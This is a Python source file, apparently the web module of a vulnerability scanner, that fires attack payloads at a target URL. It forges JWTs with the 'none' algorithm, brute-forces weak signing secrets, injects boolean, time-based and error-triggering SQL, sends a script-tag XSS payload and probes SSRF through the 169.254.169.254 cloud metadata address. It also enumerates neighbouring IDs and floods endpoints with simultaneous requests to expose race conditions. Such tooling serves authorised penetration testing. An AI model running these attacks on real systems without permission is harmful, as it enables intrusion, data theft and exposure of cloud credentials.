import requests
import jwt
import time
import re
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

# --- JWT ALGORITHMS ---

def check_jwt(target, logger, token=None):
    if not token:
        logger.info("No JWT token provided/found. Skipping JWT checks.")
        return []

    logger.info("Starting JWT Vulnerability Analysis...")
    findings = []

    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        logger.info(f"JWT Header: {header}")
        logger.info(f"JWT Payload: {payload}")
    except Exception as e:
        logger.error(f"Invalid JWT format: {e}")
        return []

    # Algo_JWT_None
    try:
        logger.info("Testing Algo_JWT_None...")
        none_token = jwt.encode(payload, key="", algorithm="none")
        # In a real scenario, we would replay this token against the target.
        # Since we don't have a specific endpoint to replay to in this abstract 'target' input,
        # we just generate the payload and log it as a potential attack vector.
        findings.append(f"Algo_JWT_None Payload: {none_token}")
    except Exception as e:
        logger.error(f"Error generating None token: {e}")

    # Algo_JWT_WeakSecret
    logger.info("Testing Algo_JWT_WeakSecret...")
    weak_secrets = ["secret", "password", "123456", "admin", "key", "auth"] # Top 10k placeholder
    found_secret = None
    for secret in weak_secrets:
        try:
            jwt.decode(token, secret, algorithms=[header.get('alg', 'HS256')])
            found_secret = secret
            break
        except jwt.InvalidSignatureError:
            continue
        except Exception:
            break

    if found_secret:
        msg = f"Algo_JWT_WeakSecret: Token signature cracked! Secret: '{found_secret}'"
        logger.success(msg)
        findings.append(msg)

    # Algo_JWT_Kid_Injection
    if 'kid' in header:
        logger.info("Testing Algo_JWT_Kid_Injection...")
        injection_payload = "1' UNION SELECT 'key';--"
        # We can't easily re-sign with a modified header using PyJWT high-level API if we don't know the key,
        # but we can manually construct it or use a library that allows it.
        # For this logic, we will flag the presence of 'kid' and suggest the payload.
        findings.append(f"Algo_JWT_Kid_Injection: 'kid' header found. Injection payload: {injection_payload}")

    # Algo_JWT_InfoLeak
    logger.info("Testing Algo_JWT_InfoLeak...")
    sensitive_keys = ['user_id', 'email', 'scope', 'role', 'admin', 'username']
    leaks = []
    for k, v in payload.items():
        if k in sensitive_keys:
            leaks.append(f"{k}: {v}")

    if leaks:
        msg = f"Algo_JWT_InfoLeak: Found sensitive data: {', '.join(leaks)}"
        logger.warning(msg)
        findings.append(msg)

    return findings

# --- SQL INJECTION ALGORITHMS ---

def check_sqli(url, logger):
    logger.info(f"Starting SQL Injection Analysis on {url}...")
    findings = []

    # Needs parameters to test. Parse from URL.
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        logger.info("No URL parameters to test for SQLi.")
        return []

    # Helper to reconstruct URL with new params
    def get_test_url(p_map):
        query = urlencode(p_map, doseq=True)
        return parsed._replace(query=query).geturl()

    # Base request for comparison
    try:
        base_resp = requests.get(url, timeout=10)
        base_len = len(base_resp.text)
    except:
        logger.error("Failed to connect to target.")
        return []

    # Algo_SQL_Boolean_Inference
    logger.info("Testing Algo_SQL_Boolean_Inference...")
    for param in params:
        # Inject AND 1=1
        test_params_true = params.copy()
        test_params_true[param] = [test_params_true[param][0] + " AND 1=1"]
        url_true = get_test_url(test_params_true)

        # Inject AND 1=2
        test_params_false = params.copy()
        test_params_false[param] = [test_params_false[param][0] + " AND 1=2"]
        url_false = get_test_url(test_params_false)

        try:
            resp_true = requests.get(url_true, timeout=10)
            resp_false = requests.get(url_false, timeout=10)

            # Compare
            # Simple heuristic: if true is close to base_len and false is significantly different
            if abs(len(resp_true.text) - base_len) < base_len * 0.1 and \
               abs(len(resp_false.text) - base_len) > base_len * 0.1:
                   msg = f"Algo_SQL_Boolean_Inference: Parameter '{param}' appears vulnerable."
                   logger.success(msg)
                   findings.append(msg)
        except:
            pass

    # Algo_SQL_TimeBased
    logger.info("Testing Algo_SQL_TimeBased...")
    sleep_payloads = [" SLEEP(5)", " pg_sleep(5)", " WAITFOR DELAY '0:0:5'"]
    for param in params:
        for payload in sleep_payloads:
            test_params = params.copy()
            test_params[param] = [test_params[param][0] + payload]
            test_url = get_test_url(test_params)

            try:
                start_time = time.time()
                requests.get(test_url, timeout=10)
                duration = time.time() - start_time

                if duration >= 5:
                    msg = f"Algo_SQL_TimeBased: Parameter '{param}' delayed by {duration:.2f}s with payload '{payload}'."
                    logger.success(msg)
                    findings.append(msg)
                    break
            except requests.exceptions.Timeout:
                 msg = f"Algo_SQL_TimeBased: Parameter '{param}' caused timeout with payload '{payload}'."
                 logger.success(msg)
                 findings.append(msg)
                 break
            except:
                pass

    # Algo_SQL_Error_Regex
    logger.info("Testing Algo_SQL_Error_Regex...")
    error_patterns = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*odbc_.*",
        r"(\W|\A)ORA-",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Microsoft Access Driver",
        r"JET Database Engine",
        r"Access Database Engine",
    ]

    # Trigger errors with single quote
    for param in params:
        test_params = params.copy()
        test_params[param] = [test_params[param][0] + "'"]
        test_url = get_test_url(test_params)

        try:
            resp = requests.get(test_url, timeout=10)
            for pattern in error_patterns:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    msg = f"Algo_SQL_Error_Regex: Found DB error in response for '{param}': {pattern}"
                    logger.success(msg)
                    findings.append(msg)
                    break
        except:
            pass

    # Algo_SQL_Auth_Bypass (Concept only since we don't have a login form parser here yet)
    findings.append("Algo_SQL_Auth_Bypass: Check login forms with payloads like ' OR '1'='1")

    return findings

# --- XSS ALGORITHMS ---

def check_xss(url, logger):
    logger.info(f"Starting XSS Analysis on {url}...")
    findings = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return []

    def get_test_url(p_map):
        query = urlencode(p_map, doseq=True)
        return parsed._replace(query=query).geturl()

    # Algo_XSS_Reflected_Context
    logger.info("Testing Algo_XSS_Reflected_Context...")
    canary = "RedSentryXSS"
    for param in params:
        test_params = params.copy()
        test_params[param] = [canary]
        test_url = get_test_url(test_params)

        try:
            resp = requests.get(test_url, timeout=10)
            if canary in resp.text:
                # Basic reflection found
                msg = f"Algo_XSS_Reflected_Context: Parameter '{param}' reflected in response."
                logger.warning(msg)
                findings.append(msg)
        except:
            pass

    # Algo_XSS_Polyglot
    logger.info("Testing Algo_XSS_Polyglot...")
    polyglot = "\"'><script>alert(1)</script>"
    for param in params:
        test_params = params.copy()
        test_params[param] = [polyglot]
        test_url = get_test_url(test_params)

        try:
            resp = requests.get(test_url, timeout=10)
            if polyglot in resp.text:
                 msg = f"Algo_XSS_Polyglot: Parameter '{param}' reflects polyglot payload."
                 logger.success(msg)
                 findings.append(msg)
        except:
            pass

    # Algo_XSS_DOM_Sink (Static Analysis of fetched JS)
    logger.info("Testing Algo_XSS_DOM_Sink...")
    try:
        resp = requests.get(url, timeout=10)
        # Find script srcs
        scripts = re.findall(r'<script[^>]+src=["\'](.*?)["\']', resp.text)
        sinks = [r'innerHTML', r'document\.write', r'location\.hash', r'eval\(', r'setTimeout\(', r'setInterval\(']

        for script_url in scripts:
            full_script_url = urljoin(url, script_url)
            try:
                js_resp = requests.get(full_script_url, timeout=10)
                for sink in sinks:
                    if re.search(sink, js_resp.text):
                         msg = f"Algo_XSS_DOM_Sink: Found dangerous sink '{sink}' in {full_script_url}"
                         logger.warning(msg)
                         findings.append(msg)
            except:
                pass
    except:
        pass

    return findings

# --- SSRF ALGORITHMS ---

def check_ssrf(url, logger):
    logger.info(f"Starting SSRF Analysis on {url}...")
    findings = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return []

    def get_test_url(p_map):
        query = urlencode(p_map, doseq=True)
        return parsed._replace(query=query).geturl()

    # Algo_SSRF_Loopback
    logger.info("Testing Algo_SSRF_Loopback...")
    loopbacks = ["http://127.0.0.1", "http://localhost", "http://0.0.0.0"]
    for param in params:
        # Heuristic: parameter name looks like a URL target? (url, link, callback, hook, host)
        if any(x in param.lower() for x in ['url', 'link', 'host', 'callback', 'webhook', 'target']):
             for lb in loopbacks:
                test_params = params.copy()
                test_params[param] = [lb]
                test_url = get_test_url(test_params)
                # Note: Testing SSRF blindly is hard without OOB interaction.
                # We check if the response changes significantly or times out differently.
                # Here we just log the attempt.
                # In a real check, we might look for "Connection refused" messages reflected from the server
                # attempting to connect to itself.
                findings.append(f"Algo_SSRF_Loopback: Test {param} with {lb}")

    # Algo_SSRF_CloudMetadata
    logger.info("Testing Algo_SSRF_CloudMetadata...")
    metadata_ip = "http://169.254.169.254/latest/meta-data/"
    for param in params:
        if any(x in param.lower() for x in ['url', 'link', 'host', 'callback', 'webhook', 'target']):
            test_params = params.copy()
            test_params[param] = [metadata_ip]
            test_url = get_test_url(test_params)

            try:
                resp = requests.get(test_url, timeout=5)
                # AWS metadata often returns specific strings
                if "ami-id" in resp.text or "instance-id" in resp.text:
                    msg = f"Algo_SSRF_CloudMetadata: CONFIRMED AWS Metadata leak via '{param}'!"
                    logger.success(msg)
                    findings.append(msg)
            except:
                pass

    return findings

# --- LOGIC ALGORITHMS ---

def check_logic(url, logger):
    logger.info(f"Starting Logic/IDOR Analysis on {url}...")
    findings = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    def get_test_url(p_map):
        query = urlencode(p_map, doseq=True)
        return parsed._replace(query=query).geturl()

    # Algo_IDOR_Sequential
    logger.info("Testing Algo_IDOR_Sequential...")
    for param, values in params.items():
        val = values[0]
        if val.isdigit():
            original_val = int(val)
            # Test +/- 1
            ids = [original_val - 1, original_val + 1]

            for test_id in ids:
                test_params = params.copy()
                test_params[param] = [str(test_id)]
                test_url = get_test_url(test_params)

                try:
                    resp = requests.get(test_url, timeout=10)
                    if resp.status_code == 200:
                         # We need to fuzzy hash or compare similarity to know if it's a valid object
                         # Here we just flag it
                         msg = f"Algo_IDOR_Sequential: Accessible resource at {param}={test_id}"
                         logger.warning(msg)
                         findings.append(msg)
                except:
                    pass

    # Algo_Race_Condition
    # We need a candidate endpoint.
    # Heuristic: endpoints with 'coupon', 'gift', 'transfer', 'vote'
    if any(x in url.lower() for x in ['coupon', 'gift', 'transfer', 'vote']):
        logger.info("Testing Algo_Race_Condition...")

        def race_worker(u, results):
            try:
                r = requests.get(u)
                results.append(r.status_code)
            except:
                pass

        threads = []
        results = []
        for _ in range(20):
            t = threading.Thread(target=race_worker, args=(url, results))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        # Analyze results
        # If multiple 200 OKs where only 1 expected? Hard to know expectation.
        # Just logging the attempt.
        findings.append(f"Algo_Race_Condition: Sent 20 simultaneous requests to {url}. Statuses: {results}")

    return findings

def run(target, logger, db):
    # Target can be a URL or just a domain.
    # If domain, we might need to assume http/https or crawl (not scope here).
    # We assume target is a full URL for SQLi/XSS checks.

    url = target
    if not url.startswith("http"):
        url = "http://" + url

    logger.info(f"Starting WEB module on {url}")

    # Ask for JWT?
    # In CLI tool, we might ask user input. For now, assume None or predefined.
    token = None
    # token = input("Enter JWT token (optional): ")

    all_findings = []

    # 1. JWT
    if token:
        jwt_findings = check_jwt(target, logger, token)
        if jwt_findings:
            db.save_finding("WEB", url, "JWT Analysis", jwt_findings)
            all_findings.extend(jwt_findings)

    # 2. SQLi
    sqli_findings = check_sqli(url, logger)
    if sqli_findings:
        db.save_finding("WEB", url, "SQLi Analysis", sqli_findings)
        all_findings.extend(sqli_findings)

    # 3. XSS
    xss_findings = check_xss(url, logger)
    if xss_findings:
        db.save_finding("WEB", url, "XSS Analysis", xss_findings)
        all_findings.extend(xss_findings)

    # 4. SSRF
    ssrf_findings = check_ssrf(url, logger)
    if ssrf_findings:
        db.save_finding("WEB", url, "SSRF Analysis", ssrf_findings)
        all_findings.extend(ssrf_findings)

    # 5. Logic
    logic_findings = check_logic(url, logger)
    if logic_findings:
        db.save_finding("WEB", url, "Logic Analysis", logic_findings)
        all_findings.extend(logic_findings)

    logger.success(f"WEB module finished for {url}")
